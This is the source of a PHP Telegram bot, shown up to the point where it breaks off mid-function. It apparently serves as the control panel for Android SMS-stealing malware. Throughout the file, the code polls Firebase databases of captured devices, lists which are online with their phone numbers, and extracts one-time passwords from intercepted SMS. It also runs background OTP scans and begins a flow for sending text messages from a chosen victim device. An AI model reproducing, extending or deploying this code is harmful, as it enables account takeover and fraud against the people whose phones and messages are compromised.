<?php
require_once 'config.php';

header('Content-Type: application/json');

// File paths
$settingsFile = __DIR__ . '/bot_settings.json';
$usersFile = __DIR__ . '/users.json';

// Helper to make API requests to Telegram
function telegramRequest($method, $params = []) {
    $url = rtrim(TELEGRAM_API_BASE, '/') . "/bot" . BOT_TOKEN . "/" . $method;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($response, true);
}

// Helper to query Firebase databases
function firebaseRequestByURL($baseUrl, $path, $method = 'GET', $data = null) {
    $url = rtrim($baseUrl, '/') . '/' . ltrim($path, '/') . '.json';
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    if ($method === 'PUT' || $method === 'PATCH' || $method === 'DELETE') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    }
    
    if ($data !== null) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    }
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($response, true);
}

// Save dynamic settings
function saveSettings($newSettings) {
    global $settingsFile;
    file_put_contents($settingsFile, json_encode($newSettings, JSON_PRETTY_PRINT));
}

// Registers user ID to database for broadcast features
function registerUser($chatId) {
    global $usersFile;
    if (file_exists($usersFile)) {
        $users = json_decode(file_get_contents($usersFile), true);
    } else {
        $users = [];
    }
    
    if (!is_array($users)) {
        $users = [];
    }
    
    if (!in_array($chatId, $users)) {
        $users[] = $chatId;
        file_put_contents($usersFile, json_encode($users));
    }
}

// Helper to query multiple Firebase databases in parallel using curl_multi
function firebaseRequestMulti($urls, $path = '/') {
    $mh = curl_multi_init();
    $handles = [];
    
    foreach ($urls as $idx => $baseUrl) {
        $url = rtrim($baseUrl, '/') . '/' . ltrim($path, '/') . '.json';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3); // 3 seconds timeout per request to keep it fast
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        
        curl_multi_add_handle($mh, $ch);
        $handles[$idx] = $ch;
    }
    
    // Robust curl_multi active execution loop
    $active = null;
    do {
        $mrc = curl_multi_exec($mh, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);

    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) == -1) {
            usleep(100);
        }
        do {
            $mrc = curl_multi_exec($mh, $active);
        } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }
    
    $responses = [];
    foreach ($handles as $idx => $ch) {
        $raw = curl_multi_getcontent($ch);
        $responses[$idx] = json_decode($raw, true);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);
    
    return $responses;
}

// Generate serial IDs: A1, A2, ..., A999, B1, B2, ...
function getShortSerialId($index) {
    $letters = range('A', 'Z');
    $letterIdx = floor($index / 999);
    $num = ($index % 999) + 1;
    if ($letterIdx < count($letters)) {
        return $letters[$letterIdx] . $num;
    }
    return 'Z' . $num;
}

function saveDeviceMappings($mappings) {
    $file = __DIR__ . '/device_mappings.json';
    file_put_contents($file, json_encode($mappings, JSON_PRETTY_PRINT));
}

function loadDeviceMappings() {
    $file = __DIR__ . '/device_mappings.json';
    if (file_exists($file)) {
        return json_decode(file_get_contents($file), true);
    }
    return [];
}

// Find the latest message ID or timestamp from the messages array
function getLatestMessageId($messages) {
    if (empty($messages) || !is_array($messages)) return 0;
    $maxId = 0;
    foreach ($messages as $msg) {
        if (is_array($msg)) {
            $id = isset($msg['id']) ? (int)$msg['id'] : 0;
            if ($id > $maxId) {
                $maxId = $id;
            }
        }
    }
    if ($maxId === 0) {
        foreach ($messages as $msg) {
            if (is_array($msg)) {
                $ts = isset($msg['timestamp']) ? (int)$msg['timestamp'] : 0;
                if ($ts > $maxId) {
                    $maxId = $ts;
                }
            }
        }
    }
    return $maxId;
}

// Check if message is new for the user, and mark it as viewed
function isMessageNew($chatId, $deviceId, $msgId) {
    if ($msgId === 0) return false;
    $file = __DIR__ . '/viewed_messages.json';
    $data = [];
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
    }
    $key = $chatId . '_' . $deviceId;
    if (!isset($data[$key])) {
        $data[$key] = $msgId;
        file_put_contents($file, json_encode($data));
        return true; // First time viewing is bold
    }
    $lastSeen = $data[$key];
    if ($msgId > $lastSeen) {
        $data[$key] = $msgId;
        file_put_contents($file, json_encode($data));
        return true;
    }
    return false;
}

function getDbNameLabel($url, $index) {
    $host = parse_url($url, PHP_URL_HOST);
    if ($host) {
        $parts = explode('.', $host);
        return str_replace('-default-rtdb', '', $parts[0]);
    }
    return "DB #" . ($index + 1);
}

// Helper: fetch + format top 5 messages for a device in parallel using curl_multi
function getTop5MessagesText($deviceId, $dbUrl, $dbIdx, $phoneLabel = '') {
    $paths = [
        'messages' => "messages/" . urlencode($deviceId),
        'user_sms' => "user_sms/" . urlencode($deviceId),
        'clients_msg' => "clients/" . urlencode($deviceId) . "/messages",
        'root' => urlencode($deviceId)
    ];
    
    $mh = curl_multi_init();
    $handles = [];
    foreach ($paths as $key => $path) {
        $url = rtrim($dbUrl, '/') . '/' . $path . '.json';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        curl_multi_add_handle($mh, $ch);
        $handles[$key] = $ch;
    }
    
    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) == -1) usleep(100);
        do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }
    
    $responses = [];
    foreach ($handles as $key => $ch) {
        $raw = curl_multi_getcontent($ch);
        $responses[$key] = json_decode($raw, true);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);
    
    $msgs = null;
    foreach (['messages', 'user_sms', 'clients_msg', 'root'] as $key) {
        if (!empty($responses[$key]) && is_array($responses[$key])) {
            $temp = array_filter($responses[$key], function($m){ return is_array($m); });
            if (!empty($temp)) {
                $msgs = $temp;
                break;
            }
        }
    }
    
    if (empty($msgs)) return null;
    
    usort($msgs, function($a, $b) {
        return (isset($b['timestamp']) ? (int)$b['timestamp'] : 0)
             - (isset($a['timestamp']) ? (int)$a['timestamp'] : 0);
    });
    
    $top5 = array_slice(array_values($msgs), 0, 5);
    if (empty($top5)) return null;
    
    $label = !empty($phoneLabel) ? "📞 *Number:* `{$phoneLabel}`\n" : '';
    $text  = $label . "🏢 *DB:* DB #" . ($dbIdx + 1) . "\n\n";
    
    foreach ($top5 as $i => $msg) {
        $body   = isset($msg['message']) ? $msg['message'] : (isset($msg['body']) ? $msg['body'] : 'No Body');
        $sender = isset($msg['sender'])  ? $msg['sender']  : (isset($msg['from']) ? $msg['from'] : 'Unknown');
        $time   = isset($msg['dateTime'])? $msg['dateTime']: (isset($msg['date']) ? $msg['date'] : 'N/A');
        preg_match('/\b\d{4,8}\b/', $body, $m);
        $otp = !empty($m) ? $m[0] : 'Not detected';
        $text .= "*Msg #" . ($i+1) . "*\n"
               . "💬 `{$body}`\n"
               . "🔑 OTP: *{$otp}*\n"
               . "📤 {$sender} | 🕐 {$time}\n"
               . "──────────────────\n";
    }
    return $text;
}

// Helper: fetch device client details and messages in a single parallelized curl_multi call
function getDeviceDetailsAndMessages($deviceId, $dbUrl) {
    $paths = [
        'clients_details' => "clients/" . urlencode($deviceId),
        'user_data_details' => "user_data/" . urlencode($deviceId),
        'messages' => "messages/" . urlencode($deviceId),
        'user_sms' => "user_sms/" . urlencode($deviceId),
        'clients_msg' => "clients/" . urlencode($deviceId) . "/messages",
        'root' => urlencode($deviceId)
    ];
    
    $mh = curl_multi_init();
    $handles = [];
    foreach ($paths as $key => $path) {
        $url = rtrim($dbUrl, '/') . '/' . $path . '.json';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        curl_multi_add_handle($mh, $ch);
        $handles[$key] = $ch;
    }
    
    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) == -1) usleep(100);
        do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }
    
    $responses = [];
    foreach ($handles as $key => $ch) {
        $raw = curl_multi_getcontent($ch);
        $responses[$key] = json_decode($raw, true);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);
    
    // Extract mobNo
    $mobNo = '';
    if (!empty($responses['clients_details']) && is_array($responses['clients_details'])) {
        $mobNo = extractMobNo($responses['clients_details']);
    }
    if (empty($mobNo) && !empty($responses['user_data_details']) && is_array($responses['user_data_details'])) {
        $mobNo = extractMobNo($responses['user_data_details']);
    }
    
    // Extract messages array
    $msgs = null;
    foreach (['messages', 'user_sms', 'clients_msg', 'root'] as $key) {
        if (!empty($responses[$key]) && is_array($responses[$key])) {
            $temp = array_filter($responses[$key], function($m){ return is_array($m); });
            if (!empty($temp)) {
                $msgs = $temp;
                break;
            }
        }
    }
    
    return [
        'mobNo' => $mobNo,
        'messages' => $msgs
    ];
}

function extractMobNo($val) {
    if (!empty($val['mobNo'])) return $val['mobNo'];
    if (!empty($val['phoneNumber'])) return $val['phoneNumber'];
    if (isset($val['sims']) && is_array($val['sims'])) {
        foreach ($val['sims'] as $sim) {
            if (is_array($sim) && !empty($sim['phoneNumber'])) {
                return $sim['phoneNumber'];
            }
        }
    }
    return '';
}

function parseDeviceData($key, $val, $dbIdx, $dbUrl) {
    if (!is_array($val)) return null;
    
    // Check status
    $isOnline = false;
    if (isset($val['status'])) {
        if (is_bool($val['status'])) {
            $isOnline = $val['status'];
        } elseif (is_string($val['status'])) {
            $isOnline = (strtolower($val['status']) === 'online');
        }
    }
    
    // Verify real-time online status via timestamp (max 300 seconds difference for clock skew)
    if ($isOnline) {
        if (isset($val['timestamp'])) {
            $timestampSec = intval($val['timestamp'] / 1000);
            $diff = abs(time() - $timestampSec);
            if ($diff > 300) {
                $isOnline = false;
            }
        }
    }
    
    // Extract name
    $name = $key;
    if (!empty($val['d_name'])) {
        $name = $val['d_name'];
    } elseif (!empty($val['name'])) {
        $name = $val['name'];
    } elseif (!empty($val['modelName'])) {
        $name = $val['modelName'];
    }
    
    // Extract mobNo
    $mobNo = extractMobNo($val);
    
    return [
        'id'     => $key,
        'name'   => $name,
        'status' => $isOnline,
        'mobNo'  => $mobNo,
        'db_idx' => $dbIdx,
        'db_url' => $dbUrl
    ];
}

function getDeviceStatsFromDBs() {
    global $firebaseUrls;
    if (empty($firebaseUrls)) {
        return ['online' => 0, 'offline' => 0];
    }
    
    $mh = curl_multi_init();
    $handles = [];
    
    foreach ($firebaseUrls as $idx => $baseUrl) {
        foreach (['clients.json', 'user_data.json'] as $path) {
            $url = rtrim($baseUrl, '/') . '/' . $path;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 seconds per DB
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_multi_add_handle($mh, $ch);
            $handles[] = ['ch' => $ch, 'url' => $baseUrl, 'idx' => $idx];
        }
    }
    
    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) == -1) usleep(100);
        do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }
    
    $devices = [];
    
    foreach ($handles as $item) {
        $ch  = $item['ch'];
        $raw = curl_multi_getcontent($ch);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
        
        $data = json_decode($raw, true);
        if (!is_array($data)) continue;
        
        foreach ($data as $key => $val) {
            if ($key === 'ok' || !is_array($val)) continue;
            $uniqueKey = $item['idx'] . '_' . $key;
            
            $parsed = parseDeviceData($key, $val, $item['idx'], $item['url']);
            if ($parsed) {
                if (isset($devices[$uniqueKey])) {
                    if ($parsed['status']) {
                        $devices[$uniqueKey]['status'] = true;
                    }
                } else {
                    $devices[$uniqueKey] = $parsed;
                }
            }
        }
    }
    curl_multi_close($mh);
    
    $onlineCount = 0;
    $offlineCount = 0;
    foreach ($devices as $dev) {
        if ($dev['status']) {
            $onlineCount++;
        } else {
            $offlineCount++;
        }
    }
    return ['online' => $onlineCount, 'offline' => $offlineCount];
}

function getAllDevicesFromDBs() {
    global $firebaseUrls;
    if (empty($firebaseUrls)) {
        return [];
    }
    
    $mh = curl_multi_init();
    $handles = [];
    
    foreach ($firebaseUrls as $idx => $baseUrl) {
        foreach (['clients.json', 'user_data.json'] as $path) {
            $url = rtrim($baseUrl, '/') . '/' . $path;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 seconds per DB
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_multi_add_handle($mh, $ch);
            $handles[] = ['ch' => $ch, 'url' => $baseUrl, 'idx' => $idx];
        }
    }
    
    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) == -1) usleep(100);
        do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }
    
    $devices = [];
    
    foreach ($handles as $item) {
        $ch  = $item['ch'];
        $raw = curl_multi_getcontent($ch);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
        
        $data = json_decode($raw, true);
        if (!is_array($data)) continue;
        
        foreach ($data as $key => $val) {
            if ($key === 'ok' || !is_array($val)) continue;
            $uniqueKey = $item['idx'] . '_' . $key;
            
            $parsed = parseDeviceData($key, $val, $item['idx'], $item['url']);
            if ($parsed) {
                if (isset($devices[$uniqueKey])) {
                    if ($parsed['status']) {
                        $devices[$uniqueKey]['status'] = true;
                    }
                    if (!empty($parsed['mobNo'])) {
                        $devices[$uniqueKey]['mobNo'] = $parsed['mobNo'];
                    }
                } else {
                    $devices[$uniqueKey] = $parsed;
                }
            }
        }
    }
    curl_multi_close($mh);
    
    $devices = array_values($devices);

    // Sort devices to ensure stable mapping
    usort($devices, function($a, $b) {
        if ($a['db_idx'] !== $b['db_idx']) {
            return $a['db_idx'] - $b['db_idx'];
        }
        return strcmp($a['id'], $b['id']);
    });

    // Rebuild and save mappings dynamically to keep device_mappings.json updated
    $mappings = [];
    foreach ($devices as $index => $dev) {
        $serialId = getShortSerialId($index);
        $mappings[$serialId] = [
            'id' => $dev['id'],
            'name' => $dev['name'],
            'db_idx' => $dev['db_idx'],
            'db_url' => $dev['db_url']
        ];
    }
    saveDeviceMappings($mappings);

    return $devices;
}

// Session state helpers
function setSessionAction($chatId, $action, $meta = []) {
    $file = __DIR__ . '/bot_sessions.json';
    $data = [];
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
    }
    $data[$chatId] = ['action' => $action, 'time' => time(), 'meta' => $meta];
    file_put_contents($file, json_encode($data));
}

function getSessionAction($chatId) {
    $file = __DIR__ . '/bot_sessions.json';
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        if (isset($data[$chatId])) {
            if (time() - $data[$chatId]['time'] < 300) { // 5 mins expiry
                return $data[$chatId]['action'];
            }
        }
    }
    return null;
}

function getSessionData($chatId) {
    $file = __DIR__ . '/bot_sessions.json';
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        if (isset($data[$chatId])) {
            if (time() - $data[$chatId]['time'] < 300) {
                return $data[$chatId];
            }
        }
    }
    return null;
}

function clearSessionAction($chatId) {
    $file = __DIR__ . '/bot_sessions.json';
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        if (isset($data[$chatId])) {
            unset($data[$chatId]);
            file_put_contents($file, json_encode($data));
        }
    }
}

function setActiveScan($chatId, $meta) {
    $file = __DIR__ . '/active_scans.json';
    $data = [];
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true) ?: [];
    }
    $data[$chatId] = $meta;
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function getActiveScans() {
    $file = __DIR__ . '/active_scans.json';
    if (file_exists($file)) {
        return json_decode(file_get_contents($file), true) ?: [];
    }
    return [];
}

// Parallel fetching of active online devices - uses /clients (fast, small data)
function getOnlineDevicesFromDBs() {
    global $firebaseUrls;
    
    // Fetch /clients.json from all DBs in parallel (much smaller than root /)
    $mh = curl_multi_init();
    $handles = [];
    
    foreach ($firebaseUrls as $idx => $baseUrl) {
        $url = rtrim($baseUrl, '/') . '/clients.json';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 seconds per DB
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        curl_multi_add_handle($mh, $ch);
        $handles[$idx] = ['ch' => $ch, 'url' => $baseUrl, 'idx' => $idx];
    }
    
    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) == -1) usleep(100);
        do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    }
    
    $onlineDevices = [];
    
    foreach ($handles as $idx => $item) {
        $ch  = $item['ch'];
        $raw = curl_multi_getcontent($ch);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
        
        $data = json_decode($raw, true);
        if (!is_array($data)) continue;
        
        foreach ($data as $key => $val) {
            if ($key === 'ok' || !is_array($val)) continue;
            
            $status = false;
            if (isset($val['status'])) {
                if (is_bool($val['status'])) {
                    $status = $val['status'];
                } elseif (is_string($val['status'])) {
                    $status = (strtolower($val['status']) === 'online');
                }
            }
            
            if ($status && isset($val['timestamp'])) {
                $timestampSec = intval($val['timestamp'] / 1000);
                $diff = time() - $timestampSec;
                if ($diff > 45 || $diff < -45) {
                    $status = false;
                }
            } else {
                $status = false;
            }
            
            if (!$status) continue;
            
            $name  = !empty($val['name']) ? $val['name'] : (!empty($val['modelName']) ? $val['modelName'] : $key);
            
            // Extract mobNo from multiple sources
            $mobNo = '';
            if (!empty($val['mobNo']))       $mobNo = $val['mobNo'];
            elseif (!empty($val['phoneNumber'])) $mobNo = $val['phoneNumber'];
            elseif (isset($val['sims']) && is_array($val['sims'])) {
                foreach ($val['sims'] as $sim) {
                    if (!empty($sim['phoneNumber'])) { $mobNo = $sim['phoneNumber']; break; }
                }
            }
            
            $onlineDevices[] = [
                'id'     => $key,
                'name'   => $name,
                'mobNo'  => $mobNo,
                'db_idx' => $item['idx'],
                'db_url' => $item['url']
            ];
        }
    }
    curl_multi_close($mh);
    return $onlineDevices;
}


// Dynamic scanning of all Firebase databases (Parallelized)

function getAllDemoNumbers() {
    global $firebaseUrls;
    $results = [];
    
    // Fetch all database roots in parallel
    $allDbData = firebaseRequestMulti($firebaseUrls, '/');
    
    foreach ($allDbData as $idx => $dbData) {
        if (empty($dbData) || !is_array($dbData)) {
            continue;
        }
        
        $url = $firebaseUrls[$idx];
        
        // 1. Structure: numbers node (explicit)
        if (isset($dbData['numbers']) && is_array($dbData['numbers'])) {
            foreach ($dbData['numbers'] as $key => $numVal) {
                $num = isset($numVal['number']) ? $numVal['number'] : $key;
                $safeKey = str_replace(['.', '$', '#', '[', ']', '/'], '_', $key);
                $uniqueId = "exp_" . $idx . "_" . $safeKey;
                $results[$uniqueId] = [
                    'db_idx' => $idx,
                    'key' => $key,
                    'type' => 'explicit',
                    'number' => $num,
                    'db_url' => $url,
                    'display' => "📱 " . $num . " [DB " . ($idx + 1) . "]"
                ];
            }
        }
        
        // 2. Structure: device/Android ID nodes at root (SMS forwarding logs)
        foreach ($dbData as $key => $val) {
            if (in_array(strtolower($key), ['users', 'all_user', 'admin', 'settings', 'numbers'])) {
                continue;
            }
            if (is_array($val)) {
                $numberName = "";
                $latestTime = 0;
                
                foreach ($val as $msgVal) {
                    if (is_array($msgVal)) {
                        $ts = isset($msgVal['timestamp']) ? (int)$msgVal['timestamp'] : 0;
                        if ($ts > $latestTime) {
                            $latestTime = $ts;
                            if (isset($msgVal['sim_number']) && $msgVal['sim_number'] !== 'SIM -1' && $msgVal['sim_number'] !== 'SIM 1') {
                                $numberName = $msgVal['sim_number'];
                            }
                        }
                    }
                }
                
                $displayName = "📟 " . substr($key, 0, 8);
                if (!empty($numberName)) {
                    $displayName .= " (" . $numberName . ")";
                }
                $displayName .= " [DB " . ($idx + 1) . "]";
                
                $uniqueId = "dev_" . $idx . "_" . $key;
                $results[$uniqueId] = [
                    'db_idx' => $idx,
                    'key' => $key,
                    'type' => 'device',
                    'number' => $key,
                    'db_url' => $url,
                    'display' => $displayName
                ];
            }
        }
    }
    return $results;
}

// Read raw body POSTed by Telegram webhook
$input  = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) {
    echo json_encode(["status" => "error", "message" => "No update received."]);
    exit;
}

// Blocked users intercept check
$chatId = null;
if (isset($update['message']['chat']['id'])) {
    $chatId = $update['message']['chat']['id'];
} elseif (isset($update['callback_query']['message']['chat']['id'])) {
    $chatId = $update['callback_query']['message']['chat']['id'];
}

if ($chatId !== null) {
    $isAdmin = ($chatId === ADMIN_CHAT_ID);
    $isAdminCommand = false;
    if ($isAdmin) {
        if (isset($update['message']['text'])) {
            $msgText = trim($update['message']['text']);
            if (strpos($msgText, '/admin') === 0 || strpos($msgText, '/status') === 0 || strpos($msgText, '/dbadd') === 0 || strpos($msgText, '/dbdel') === 0 || strpos($msgText, '/broadcast') === 0) {
                $isAdminCommand = true;
            }
        }
    }

    $blockedFile = __DIR__ . '/blocked_users.json';
    $blockedList = file_exists($blockedFile) ? (json_decode(file_get_contents($blockedFile), true) ?: []) : [];
    if (in_array($chatId, $blockedList) && !$isAdmin) {
        // If it's a callback query, answer it with an alert first
        if (isset($update['callback_query'])) {
            telegramRequest('answerCallbackQuery', [
                'callback_query_id' => $update['callback_query']['id'],
                'text' => "❌ You are BLOCKED. Contact Administrator.",
                'show_alert' => true
            ]);
        }
        
        // Strip custom keyboards and tell user they are blocked
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => "❌ *You are BLOCKED.*\n\n⚠️ Contact Administrator for assistance.",
            'parse_mode' => 'Markdown',
            'reply_markup' => ['remove_keyboard' => true]
        ]);
        exit;
    }
    
    // Required Telegram Channels membership verification (checks admin too, unless they are running an admin command)
    if (!$isAdminCommand) {
        $settingsFile = __DIR__ . '/bot_settings.json';
        $settings = file_exists($settingsFile) ? json_decode(file_get_contents($settingsFile), true) : [];
        $channels = isset($settings['channels']) ? $settings['channels'] : [];
        
        $isVerifyCallback = (isset($update['callback_query']) && $update['callback_query']['data'] === 'verify_channels');
        
        if (!empty($channels)) {
            $isMember = true;
            $missingChannels = [];
            
            foreach ($channels as $chan) {
                // If it is a numeric ID (e.g. -100123456) or starts with @
                $chatTarget = (is_numeric($chan) || $chan[0] === '@') ? $chan : '@' . $chan;
                
                $res = telegramRequest('getChatMember', [
                    'chat_id' => $chatTarget,
                    'user_id' => $chatId
                ]);
                
                $status = isset($res['result']['status']) ? $res['result']['status'] : '';
                if (!in_array($status, ['creator', 'administrator', 'member'])) {
                    $isMember = false;
                    $missingChannels[] = $chan;
                }
            }
            
            if (!$isMember) {
                if (isset($update['callback_query'])) {
                    telegramRequest('answerCallbackQuery', [
                        'callback_query_id' => $update['callback_query']['id'],
                        'text' => "⚠️ You must join all channels first!",
                        'show_alert' => true
                    ]);
                    
                    if (!$isVerifyCallback) {
                        exit;
                    }
                }
                
                // Build dynamic direct join links
                $buttons = [];
                foreach ($missingChannels as $chan) {
                    $cleanChanName = ltrim($chan, '@');
                    $url = is_numeric($cleanChanName) ? "https://t.me/c/" . substr($cleanChanName, 4) : "https://t.me/" . $cleanChanName;
                    $buttons[] = [['text' => "📢 Join " . $chan, 'url' => $url]];
                }
                $buttons[] = [['text' => "🔄 Verify Membership", 'callback_data' => 'verify_channels']];
                
                telegramRequest('sendMessage', [
                    'chat_id' => $chatId,
                    'text' => "⚠️ *Access Denied!*\n\nYou must join our required Telegram channel(s) before you can use this bot.\n\n*Please join the channel(s) below:*",
                    'parse_mode' => 'Markdown',
                    'reply_markup' => ['inline_keyboard' => $buttons]
                ]);
                exit;
            } else {
                if ($isVerifyCallback) {
                    telegramRequest('answerCallbackQuery', [
                        'callback_query_id' => $update['callback_query']['id'],
                        'text' => "✅ Verification successful! Welcome.",
                        'show_alert' => true
                    ]);
                    
                    telegramRequest('sendMessage', [
                        'chat_id' => $chatId,
                        'text' => "🎉 *Verification Successful!*\n\nYou are now authorized to use all bot commands. Send `/start` to begin.",
                        'parse_mode' => 'Markdown'
                    ]);
                    exit;
                }
            }
        }
    }
}

// ── Deduplication: disabled for local testing ─────────────────────────────
/*
$updateId   = isset($update['update_id']) ? (int)$update['update_id'] : 0;
$dedupeFile = __DIR__ . '/last_update_id.txt';
$lastUpdateId = file_exists($dedupeFile) ? (int)file_get_contents($lastOffsetFile) : 0;
if ($updateId > 0 && $updateId <= $lastUpdateId) {
    echo json_encode(["status" => "ok", "message" => "duplicate"]);
    exit;
}
if ($updateId > 0) {
    file_put_contents($dedupeFile, $updateId);
}
*/
// ─────────────────────────────────────────────────────────────────────────

if (isset($update['message'])) {
    $message = $update['message'];
    $chatId = $message['chat']['id'];
    $text = isset($message['text']) ? trim($message['text']) : '';
    $isAdmin = ($chatId === ADMIN_CHAT_ID);
    
    // Register user for broadcasting
    registerUser($chatId);

    // Stop active scanning if the user types any message or command
    $scansFile = __DIR__ . '/active_scans.json';
    if (file_exists($scansFile)) {
        $scans = json_decode(file_get_contents($scansFile), true) ?: [];
        if (isset($scans[$chatId])) {
            unset($scans[$chatId]);
            file_put_contents($scansFile, json_encode($scans, JSON_PRETTY_PRINT));
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "⏹️ *Background OTP scanning stopped.*",
                'parse_mode' => 'Markdown'
            ]);
        }
    }


    // Bot off check
    if (!BOT_ENABLED && !$isAdminCommand) {
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => "😴 *Bot is currently turned OFF by the administrator. Please try again later.*",
            'parse_mode' => 'Markdown'
        ]);
        exit;
    }



    // Check session actions (Interactive inputs)
    $session = getSessionAction($chatId);

    // ── Session: waiting for send message phone number ──────────────────
    if ($session === 'waiting_for_send_msg_num' && strpos($text, '/') !== 0) {
        $meta = getSessionData($chatId)['meta'] ?? [];
        
        $to = preg_replace('/\D/', '', trim($text));
        if (empty($to)) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ Invalid phone number. Please try again."
            ]);
            exit;
        }
        
        $deviceId = $meta['device_id'] ?? '';
        $dbUrl = $meta['db_url'] ?? '';
        $dbIdx = $meta['db_idx'] ?? 0;
        
        if (empty($deviceId) || empty($dbUrl)) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
                'text' => "❌ Session expired or device info missing. Please select the device again."
            ]);
            clearSessionAction($chatId);
            exit;
        }
        
        // Save the phone number to meta and move to next step
        $meta['to'] = $to;
        setSessionAction($chatId, 'waiting_for_send_msg_text', $meta);
        
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => "✍️ *Enter the Message Text you want to send:*\n\n_Example: Hello, this is a test message 123._",
            'parse_mode' => 'Markdown'
        ]);
        exit;
    }

    // ── Session: waiting for send message text ─────────────────────────
    if ($session === 'waiting_for_send_msg_text' && strpos($text, '/') !== 0) {
        $meta = getSessionData($chatId)['meta'] ?? [];
        clearSessionAction($chatId);
        
        $messageText = trim($text);
        if (empty($messageText)) {
            telegramRequest('sendMessage', [
                'chat_id' => $chatId,
